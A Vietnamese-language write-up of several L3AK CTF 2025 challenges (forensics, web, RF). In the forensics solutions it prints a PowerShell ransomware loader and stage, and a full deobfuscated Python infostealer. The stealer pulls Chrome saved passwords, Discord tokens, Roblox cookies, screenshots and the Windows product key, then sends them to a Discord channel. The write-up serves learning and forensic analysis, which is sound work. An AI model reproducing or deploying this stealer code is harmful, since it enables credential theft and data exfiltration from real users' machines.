---
title: 'L3AK CTF 2025'
description: 'That's my first write-up.'
pubDate: 'Sept 23 2025'
tags: ['Write-Up', 'Forensics', 'Web']
---
## Lời nói đầu
Đây là một trong những Write-Up đàu tiên của mình khi bắt đầu chơi CTF. Ở giải lần này mình chỉ làm đc 3 bài Forensics và 2 bải lẻ ở mức easy, nhưng trong Write-Up này chỉ viết có 2 bài Forensics (vì lúc đó mình lười hehe). Thôi thì, đến với phần chính nào.
# Forensics
## Ghost In The Dark
### Challenge Description
> A removable drive was recovered from a compromised
> system. Files appear encrypted, and a strange ransom
> note is all that remains.
> The payload? Gone.
> The key? Vanished.
> But traces linger in the shadows. Recover what was lost.
> Password to open zip - L3akCTF

> Author: VivisGhost
### Solution
Bài cho một file Disk nên mình sử dụng `FTK imager` để phân tích, sau khi mở ra thì có thể thấy một vài file trông khá đáng nghi

![image](/src/images/Ghost In The Dark/img1.png)

Bắt đầu từ file `loader.ps1`
```shell!
$key = [System.Text.Encoding]::UTF8.GetBytes("0123456789abcdef")
$iv  = [System.Text.Encoding]::UTF8.GetBytes("abcdef9876543210")

$AES = New-Object System.Security.Cryptography.AesManaged
$AES.Key = $key
$AES.IV = $iv
$AES.Mode = "CBC"
$AES.Padding = "PKCS7"

$enc = Get-Content "L:\payload.enc" -Raw
$bytes = [System.Convert]::FromBase64String($enc)
$decryptor = $AES.CreateDecryptor()
$plaintext = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
$script = [System.Text.Encoding]::UTF8.GetString($plaintext)

Invoke-Expression $script

# Self-delete
Remove-Item $MyInvocation.MyCommand.Path
```
Đọc qua thì thấy file này dùng để Decrypt dữ liệu Base64 từ file `payload.enc` với `key` và `IV` đã có thì có thể làm lại trên cyberchef và xem nội dung của file `payload.enc` là gì
```shell!
$key = [System.Text.Encoding]::UTF8.GetBytes("m4yb3w3d0nt3x1st")
$iv  = [System.Text.Encoding]::UTF8.GetBytes("l1f31sf0rl1v1ng!")

$AES = New-Object System.Security.Cryptography.AesManaged
$AES.Key = $key
$AES.IV = $iv
$AES.Mode = "CBC"
$AES.Padding = "PKCS7"

# Load plaintext flag from C:\ (never written to L:\ in plaintext)
$flag = Get-Content "C:\Users\Blue\Desktop\StageRansomware\flag.txt" -Raw
$encryptor = $AES.CreateEncryptor()
$bytes = [System.Text.Encoding]::UTF8.GetBytes($flag)
$cipher = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
[System.IO.File]::WriteAllBytes("L:\flag.enc", $cipher)

# Encrypt other files staged in D:\ (or L:\ if you're using L:\ now)
$files = Get-ChildItem "L:\" -File | Where-Object {
    $_.Name -notin @("ransom.ps1", "ransom_note.txt", "flag.enc", "payload.enc", "loader.ps1")
}

foreach ($file in $files) {
    $plaintext = Get-Content $file.FullName -Raw
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plaintext)
    $cipher = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [System.IO.File]::WriteAllBytes("L:\$($file.BaseName).enc", $cipher)
    Remove-Item $file.FullName
}

# Write ransom note
$ransomNote = @"
i didn't mean to encrypt them.
i was just trying to remember.

the key? maybe it's still somewhere in the dark.
the script? it was scared, so it disappeared too.

maybe you'll find me.
maybe you'll find yourself.

- vivi (or his ghost)
"@
Set-Content "L:\ransom_note.txt" $ransomNote -Encoding UTF8

# Self-delete
Remove-Item $MyInvocation.MyCommand.Path
```
Mục đích chính của đoạn script dùng để Encrypt nội dung của file `flag.enc` bằng AES với `key=m4yb3w3d0nt3x1st` và `IV=l1f31sf0rl1v1ng!`
Sau khi Decrypt ta nhận được flag

![image](/src/images/Ghost In The Dark/img2.png)

**Flag: L3AK{d3let3d_but_n0t_f0rg0tt3n}**
## BOMbardino crocodile
### Challenge Description
> APT Lobster has successfully breached a machine in our
> network, marking their first confirmed intrusion.
> Fortunately, the DFIR team acted quickly, isolating the
> compromised system and collecting several suspicious
> files for analysis. Among the evidence, they also
> recovered an outbound email sent by the attacker just
> before containment, I wonder who was he communicating
> with ... The flag consists of 2 parts.

> Author: warlocksmurf

### Sollution
Bài cho một file email và một thư mục dạng Disk
Mở file email lên xem thử thì thấy được một đường dẫn mời vào discord

![image](/src/images/BOMbardino crocodile/img1.png)

Sau khi vào group Discord ở trên thì thấy có 2 file trong kênh đó là `pay2winflag.jpg.enc` và `passwords.zip`, file `passwords.zip` không có gì, còn file `pay2winflag.jpg.enc` có vẻ đã bị Encrypt

![image](/src/images/BOMbardino crocodile/img2.png)

Mở thư mục đã cho bằng `FTK imager` và kiểm tra thì thấy có file tên `WindowsSecure.bat` có nội dung khá đáng nghi nằm tại
`C/Users/crustacean/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup`

![image](/src/images/BOMbardino crocodile/img3.png)

Nội dung là một đoạn mã đã bị obfuscate có thể thấy phần dưới là nội dung đã bị obfuscate còn bên trên là các ký tự tương ứng
Dựng lại code python để chạy xem nội dung phần ở dưới là gì
```python!
mapping = {
    "ts": "cls", "cv": "\"", "ms": "-", "gt": ".", "ax": "/", "nc": "0", "bs": "3",
    "tc": "4", "ch": ":", "wj": "A", "rd": "B", "ui": "C", "jl": "D", "vv": "H",
    "hp": "K", "cm": "L", "rz": "P", "kv": "S", "ym": "U", "uj": "W", "dt": "\\",
    "up": "_", "qx": "a", "da": "b", "qf": "c", "bl": "d", "ke": "e", "fn": "f",
    "jq": "g", "ea": "h", "lc": "i", "ln": "j", "wc": "k", "nt": "l", "zm": "m",
    "pm": "n", "hr": "o", "xv": "p", "bi": "q", "ae": "r", "eh": "s", "og": "t",
    "zk": "u", "vf": "v", "jm": "w", "sf": "x", "gp": "y", "ny": "z", "xe": "{"
}

import re
def decode_line(line):
    return re.sub(r'%([a-z]{2})%', lambda m: mapping.get(m.group(1), m.group(0)), line)
with open("encoded.txt", "r", encoding="utf-8") as f:
    for line in f:
        decoded = decode_line(line.strip())
        print(decoded)
```
Sau khi chạy có khá nhiều đoạn mã rác nhưng nằm ở giữa có phần ta cần tìm

![image](/src/images/BOMbardino crocodile/img4.png)

Ta nhận được nửa đầu của flag `L3AK{Br40d0_st34L3r_` và một đoạn mã PowerShell 
`startcls/minclspowershell.execls-WindowStyleHiddencls-Commandcls"C:\Users\Public\Document\pythonclsC:\Users\Public\Document\Lib\leak.py"`
Đoạn mã này chạy file `leak.py`
Sau khi kiểm tra theo đường dẫn ở trên thì ta đọc được nội dung của file `leak.py`

![image](/src/images/BOMbardino crocodile/img5.png)

Thấy được phần quan trọng nhất
```python!
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=kSKnoFWoxWW5d2bYl3avlVajlDUWZETjdkTwZVMs9mUyoUYiRkThRWbodlWYlUNWFDZ3RFbkBVVXJ1RXtmVPJVMKR1Vsp1Vj1mUZRFbOFmYGRGMW1GeoJVMadl.......'
```
Đoạn mã này đảo ngược lại chuỗi ở trên và giải mã Base64
Sau vài lần giải mã bằng cyberchef thì ta nhận được một đoạn code
```python!
import psutil
import platform
import json
from datetime import datetime
from time import sleep
import requests
import socket
from requests import get
import os
import re
import subprocess
from uuid import getnode as get_mac
import browser_cookie3 as steal, requests, base64, random, string, zipfile, shutil, os, re, sys, sqlite3
from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend
from Crypto.Cipher import AES
from base64 import b64decode, b64encode
from subprocess import Popen, PIPE
from json import loads, dumps
from shutil import copyfile
from sys import argv
import discord
from discord.ext import commands
from io import BytesIO

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

def scale(bytes, suffix="B"):
    defined = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < defined:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= defined

uname = platform.uname()
bt = datetime.fromtimestamp(psutil.boot_time())
host = socket.gethostname()
localip = socket.gethostbyname(host)

publicip = get(f'https://ipinfo.io/ip').text
city = get(f'https://ipinfo.io/{publicip}/city').text
region = get(f'https://ipinfo.io/{publicip}/region').text
postal = get(f'https://ipinfo.io/{publicip}/postal').text
timezone = get(f'https://ipinfo.io/{publicip}/timezone').text
currency = get(f'https://ipinfo.io/{publicip}/currency').text
country = get(f'https://ipinfo.io/{publicip}/country').text
loc = get(f"https://ipinfo.io/{publicip}/loc").text
vpn = requests.get('http://ip-api.com/json?fields=proxy')
proxy = vpn.json()['proxy']
mac = get_mac()

roaming = os.getenv('AppData')
output = open(roaming + "temp.txt", "a")

Directories = {
        'Discord': roaming + '\\Discord',
        'Discord Two': roaming + '\\discord',
        'Discord Canary': roaming + '\\Discordcanary',
        'Discord Canary Two': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': roaming + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': roaming + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': roaming + '\\Yandex\\YandexBrowser\\User Data\\Default',
}

def Yoink(Directory):
    Directory += '\\Local Storage\\leveldb'
    Tokens = []

    for FileName in os.listdir(Directory):
        if not FileName.endswith('.log') and not FileName.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{Directory}\\{FileName}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for Token in re.findall(regex, line):
                    Tokens.append(Token)

    return Tokens

def Wipe():
    if os.path.exists(roaming + "temp.txt"):
      output2 = open(roaming + "temp.txt", "w")
      output2.write("")
      output2.close()
    else:
      pass

realshit = ""
for Discord, Directory in Directories.items():
    if os.path.exists(Directory):
        Tokens = Yoink(Directory)
        if len(Tokens) > 0:
            for Token in Tokens:
                realshit += f"{Token}\n"

cpufreq = psutil.cpu_freq()
svmem = psutil.virtual_memory()
partitions = psutil.disk_partitions()
disk_io = psutil.disk_io_counters()
net_io = psutil.net_io_counters()

partitions = psutil.disk_partitions()
partition_usage = None
for partition in partitions:
    try:
        partition_usage = psutil.disk_usage(partition.mountpoint)
        break
    except PermissionError:
        continue

system_info = {
    "embeds": [
        {
            "title": f"Hah Gottem! - {host}",
            "color": 8781568
        },
        {
            "color": 7506394,
            "fields": [
                {
                    "name": "GeoLocation",
                    "value": f"Using VPN?: {proxy}\nLocal IP: {localip}\nPublic IP: {publicip}\nMAC Adress: {mac}\n\nCountry: {country} | {loc} | {timezone}\nregion: {region}\nCity: {city} | {postal}\nCurrency: {currency}\n\n\n\n"
                }
            ]
        },
        {
            "fields": [
                {
                    "name": "System Information",
                    "value": f"System: {uname.system}\nNode: {uname.node}\nMachine: {uname.machine}\nProcessor: {uname.processor}\n\nBoot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}"
                }
            ]
        },
        {
            "color": 15109662,
            "fields": [
                {
                    "name": "CPU Information",
                    "value": f"Psychical cores: {psutil.cpu_count(logical=False)}\nTotal Cores: {psutil.cpu_count(logical=True)}\n\nMax Frequency: {cpufreq.max:.2f}Mhz\nMin Frequency: {cpufreq.min:.2f}Mhz\n\nTotal CPU usage: {psutil.cpu_percent()}\n"
                },
                {
                    "name": "Memory Information",
                    "value": f"Total: {scale(svmem.total)}\nAvailable: {scale(svmem.available)}\nUsed: {scale(svmem.used)}\nPercentage: {svmem.percent}%"
                },
                {
                    "name": "Disk Information",
                    "value": f"Total Size: {scale(partition_usage.total)}\nUsed: {scale(partition_usage.used)}\nFree: {scale(partition_usage.free)}\nPercentage: {partition_usage.percent}%\n\nTotal read: {scale(disk_io.read_bytes)}\nTotal write: {scale(disk_io.write_bytes)}"
                },
                {
                    "name": "Network Information",
                    "value": f"Total Sent: {scale(net_io.bytes_sent)}\nTotal Received: {scale(net_io.bytes_recv)}"
                }
            ]
        },
        {
            "color": 7440378,
            "fields": [
                {
                    "name": "Discord information",
                    "value": f"Token: {realshit}"
                }
            ]
        }
    ]
}

DBP = r'Google\Chrome\User Data\Default\Login Data'
ADP = os.environ['LOCALAPPDATA']

def sniff(path):
    path += '\\Local Storage\\leveldb'

    tokens = []
    try:
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens
    except:
        pass


def encrypt(cipher, plaintext, nonce):
    cipher.mode = modes.GCM(nonce)
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext)
    return (cipher, ciphertext, nonce)


def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext)


def rcipher(key):
    cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
    return cipher


def dpapi(encrypted):
    import ctypes
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result


def localdata():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]


def decryptions(encrypted_txt):
    encoded_key = localdata()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = rcipher(key)
    return decrypt(cipher, encrypted_txt[15:], nonce)


class chrome:
    def __init__(self):
        self.passwordList = []

    def chromedb(self):
        _full_path = os.path.join(ADP, DBP)
        _temp_path = os.path.join(ADP, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path, _temp_path)
        self.pwsd(_temp_path)
        
    def pwsd(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.cdecrypt(row[2])
            _info = '[==================]\nhostname => : %s\nlogin => : %s\nvalue => : %s\n[==================]\n\n' % (host, name, value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)

    def cdecrypt(self, encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = dpapi(encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = decryptions(encrypted_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            pass

    def saved(self):
        try:
            with open(r'C:\ProgramData\passwords.txt', 'w', encoding='utf-8') as f:
                f.writelines(self.passwordList)
        except WindowsError:
            return None

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')
    
    channel = bot.get_channel(CHANNEL_ID)
    if not channel:
        print(f"Could not find channel with ID: {CHANNEL_ID}")
        return
    
    main = chrome()
    try:
        main.chromedb()
    except Exception as e:
        print(f"Error getting Chrome passwords: {e}")
    main.saved()
    
    await exfiltrate_data(channel)
    
    await bot.close()

async def exfiltrate_data(channel):
    try:
        hostname = requests.get("https://ipinfo.io/ip").text
    except:
        hostname = "Unknown"
    
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '\n'
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += '```'
        tokens = sniff(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            pass
        message += '```'

    try:
        from PIL import ImageGrab
        from Crypto.Cipher import ARC4
        screenshot = ImageGrab.grab()
        screenshot_path = os.getenv('ProgramData') + r'\pay2winflag.jpg'
        screenshot.save(screenshot_path)

        with open(screenshot_path, 'rb') as f:
            image_data = f.read()

        key = b'tralalero_tralala'
        cipher = ARC4.new(key)
        encrypted_data = cipher.encrypt(image_data)

        encrypted_path = screenshot_path + '.enc'
        with open(encrypted_path, 'wb') as f:
            f.write(encrypted_data)

        await channel.send(f"Screenshot from {hostname} (Pay $500 for the key)", file=discord.File(encrypted_path))

    except Exception as e:
        print(f"Error taking screenshot: {e}")

    try:
        zname = r'C:\ProgramData\passwords.zip'
        newzip = zipfile.ZipFile(zname, 'w')
        newzip.write(r'C:\ProgramData\passwords.txt')
        newzip.close()
        
        await channel.send(f"Passwords from {hostname}", file=discord.File(zname))
    except Exception as e:
        print(f"Error with password file: {e}")

    try:
        usr = os.getenv("UserName")
        keys = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\n')[1].strip()
        types = subprocess.check_output('wmic os get Caption').decode().split('\n')[1].strip()
    except Exception as e:
        print(f"Error getting system info: {e}")
        usr = "Unknown"
        keys = "Unknown"
        types = "Unknown"

    cookie = [".ROBLOSECURITY"]
    cookies = []
    limit = 2000
    roblox = "No Roblox cookies found"

    try:
        cookies.extend(list(steal.chrome()))
    except Exception as e:
        print(f"Error stealing Chrome cookies: {e}")

    try:
        cookies.extend(list(steal.firefox()))
    except Exception as e:
        print(f"Error stealing Firefox cookies: {e}")

    try:
        for y in cookie:
            send = str([str(x) for x in cookies if y in str(x)])
            chunks = [send[i:i + limit] for i in range(0, len(send), limit)]
            for z in chunks:
                roblox = f'```{z}```'
    except Exception as e:
        print(f"Error processing cookies: {e}")

    embed = discord.Embed(title=f"Data from {hostname}", description="A victim's data was extracted, here's the details:", color=discord.Color.blue())
    embed.add_field(name="Windows Key", value=f"User: {usr}\nType: {types}\nKey: {keys}", inline=False)
    embed.add_field(name="Roblox Security", value=roblox[:1024], inline=False)
    embed.add_field(name="Tokens", value=message[:1024], inline=False)
    
    await channel.send(embed=embed)
    
    with open(r'C:\ProgramData\system_info.json', 'w', encoding='utf-8') as f:
        json.dump(system_info, f, indent=4, ensure_ascii=False)
    
    await channel.send(file=discord.File(r'C:\ProgramData\system_info.json'))

    try:
        os.remove(r'C:\ProgramData\pay2winflag.jpg')
        os.remove(r'C:\ProgramData\pay2winflag.jpg.enc')
        os.remove(r'C:\ProgramData\passwords.zip')
        os.remove(r'C:\ProgramData\passwords.txt')
        os.remove(r'C:\ProgramData\system_info.json')
    except Exception as e:
        print(f"Error cleaning up: {e}")

BOT_TOKEN = "CTF{fake_token_for_writeup}" //Phần token này phải xóa đi để up lên github ;-;g
CHANNEL_ID = 1337

if __name__ == "__main__":
    bot.run(BOT_TOKEN)
mÇ±
```
Nó chính là con bot Discord mà ta đã thấy ở phần đầu
Trong code có thể thấy file `pay2winflag.png.enc` đã bị encrypt với RC4 bằng key `tralalero_tralala`
Làm tương tự trên cyberchef và ta nhận được kết quả

![image](/src/images/BOMbardino crocodile/img6.png)

Như vậy ta nhận được flag hoàn chỉnh 
**Flag: L3AK{Br40d0_st34L3r_0r_br41nr0t}**
# Web
## Flag L3ak
### Challenge Description
> What's the name of this CTF? Yk what to do

> Author: p._.k

### Sollution 
Truy cập vào trang web thì có thể thấy các bài blog và có chức năng tìm kiếm với giới hạn hà 3 ký tự

![image](/src/images/Flag L3ak/img1.png)

Tìm thử với chuỗi `L3A` thì thấy có hai bài viết trong đó 1 bài chứa fake flag và bài còn lại có flag thật nhưng đã bị thay thế bởi dấu *

![image](/src/images/Flag L3ak/img2.png)

Ý tưởng của mình là tìm dần từ chuỗi `K{` là phần cuối của chuỗi flag đã biết, còn ký tự cuối sẽ brute force đến khi đúng
```python!
import requests
charset = (
    '0123456789'
    'abcdefghijklmnopqrstuvwxyz'
    'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    '!@#$%^&*()-_=+[]{}|;:\'",.<>?/\\`~ '
)

URL = 'http://34.134.162.213:17000/api/search'
flag = 'L3AK{' 

while True:
    found = False
    for c in charset:
        query = (flag + c)[-3:]  
        try:
            res = requests.post(URL, json={"query": query})
            if res.status_code != 200:
                print(f"[!] HTTP {res.status_code} - query: '{query}'")
                continue

            data = res.json()
            results = data.get("results", [])
            if any(post['title'] == "Not the flag?" for post in results):
                flag += c
                print(f"[+] Đúng tiếp theo: '{c}' -> flag: {flag}")
                found = True
                break

        except Exception as e:
            print(f"[!] Request error: {e}")
            continue
print(f"Flag tìm được: {flag}")

```
Sau khi chạy mình nhận được flag
**FLAG: L3AK{L3ak1ng_th3_Fl4g??}**
# Hardware-RF
## Strange Transmission
### Challenge Description
> I received this strange transmission and I'm not sure what
> to make of it! Weird beeps, static noise, then silence. Can
> you help me figure out what it all means?

> Author: Suvoni

### Sollution
Bài cho một file `.wav`, sau khi mở lên nghe thử thì thấy đoạn âm thanh này chia ra làm 2 phần, ở phần đầu có thể dễ dàng biết đây là mã morse, còn phần sau thì âm thanh khá hỗn loạn
Với đoạn đầu mình sử dụng [morsecode.world](https://morsecode.world/international/decoder/audio-decoder-adaptive.html) để dịch ra kết quả

![image](/src/images/Strange Transmission/img1.png)

Sau khi gõ lại thì nhận được nửa đầu của flag **L3AK{WELC0M3_T0_TH3_H4RDW4R3_RF_**
Ở nửa sau mình mở file âm thanh này lên bằng `audacity` và chuyển chế độ xem qua Spectrogram thì nhận được nửa còn lại của flag

![image](/src/images/Strange Transmission/img2.png)

**FLag: L3AK{WELC0M3_T0_TH3_H4RDW4R3_RF_c4tegory_w3_h0p3_you_h4ve_fun!}**
